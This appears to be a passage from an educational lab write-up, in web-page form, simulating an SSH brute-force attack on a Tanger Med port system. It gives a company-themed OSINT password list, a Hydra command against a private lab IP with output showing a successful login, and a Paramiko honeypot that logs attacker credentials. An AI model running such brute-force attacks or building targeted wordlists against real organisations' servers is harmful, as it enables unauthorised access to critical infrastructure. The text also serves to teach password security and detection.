<section class="SP">
<div class="W">
  <div class="IB C"><div class="ibl">📖 For Learners — What is SSH Brute Force?</div><p>SSH (Secure Shell, port 22) is the standard remote management protocol for Linux servers. Every SCADA system, web server, and network device in a port uses SSH for remote access. Brute force means systematically trying passwords until one works. The critical insight in this simulation: instead of using a massive generic list (like rockyou.txt with 14 million entries), we built a <strong>contextual OSINT wordlist</strong> — passwords a Tanger Med employee would actually create — and found the correct password in just <strong>4 attempts</strong>. This demonstrates that password policies matter far more than people think.</p></div>
  <div class="DTL">
    <div>
      <div class="eye R" style="margin-bottom:12px;">Step A — Building the OSINT Wordlist</div>
      <h3 class="DS" style="margin-bottom:12px;">Why <span class="tr">context beats volume</span></h3>
      <p class="BM" style="margin-bottom:12px;">Using public information about Tanger Med (official website, LinkedIn profiles, press releases, job postings), we built a targeted list of likely passwords. Real attackers do this before every campaign — it's called "OSINT reconnaissance." The result: the correct password appeared at position #4, while a generic wordlist might have tried millions of entries first.</p>
      <pre class="CB R"><span class="CC"># tangermed_wordlist.txt — OSINT thematic wordlist built from public data</span>
<span class="OUT">port_admin</span>          <span class="CC">← from job posting titles</span>
<span class="OUT">crane_op_01</span>         <span class="CC">← from operational terminology</span>
<span class="OUT">scada_admin</span>         <span class="CC">← from SCADA system references</span>
<span class="WRN">tangermed2024</span>       <span class="CC">← FOUND at attempt #4 ✓</span>
<span class="OUT">TangerMed@2026</span>
<span class="OUT">Morocco@port</span>
<span class="OUT">container123</span>
<span class="OUT">maritime_2026</span>
<span class="OUT">supervisor01</span>
<span class="OUT">logistix@2024</span>
<span class="CC">... + 90 more contextual passwords</span></pre>

      <div class="eye R" style="margin-bottom:12px;margin-top:20px;">Step B — Launching Hydra Attack</div>
      <h3 class="DS" style="margin-bottom:12px;">Breaking in with <span class="tr">4 attempts</span></h3>
      <p class="BM" style="margin-bottom:12px;">Hydra is the most widely used network login attack tool. The <strong>-l flag</strong> specifies the username (portuser, discovered via recon), <strong>-P</strong> specifies our wordlist, <strong>-t 4</strong> uses 4 parallel threads, and <strong>-V</strong> shows verbose output so we see each attempt in real time. The attack runs against SSH on port 22 of the target.</p>
      <pre class="CB R"><span class="CC"># Step B — Run Hydra from Kali Linux</span>
<span class="CMD">hydra</span> <span class="FLG">-l</span> <span class="VAL">portuser</span> <span class="FLG">-P</span> <span class="VAL">~/ssh_lab/tangermed_wordlist.txt</span> <span class="FLG">-t 4 -V</span> <span class="VAL">192.168.64.2 ssh</span>

<span class="CC"># Live output — each attempt visible:</span>
<span class="OUT">[ATTEMPT][ssh] host: 192.168.64.2  login: portuser  pass: port_admin     → FAILED</span>
<span class="OUT">[ATTEMPT][ssh] host: 192.168.64.2  login: portuser  pass: crane_op_01    → FAILED</span>
<span class="OUT">[ATTEMPT][ssh] host: 192.168.64.2  login: portuser  pass: scada_admin    → FAILED</span>
<span class="OK">[22][ssh] host: 192.168.64.2   login: portuser   password: tangermed2024</span>
<span class="OK">1 of 1 target successfully completed</span>

<span class="WRN">Time to compromise: &lt; 4 minutes | Attempts needed: 4</span></pre>

      <div class="eye R" style="margin-bottom:12px;margin-top:20px;">Step C — Honeypot on Port 2222</div>
      <h3 class="DS" style="margin-bottom:12px;">The invisible <span class="ta">intelligence trap</span></h3>
      <p class="BM" style="margin-bottom:12px;">Simultaneously, a Python honeypot (built with Paramiko — the same library as real SSH servers) listens on port 2222. It perfectly mimics an SSH server's handshake but never grants access. When Fail2ban blocks port 22, Hydra automatically pivots to port 2222 — and we silently collect every credential it tries. The attacker never knows they walked into a trap. 89 credentials captured with full attacker fingerprint.</p>
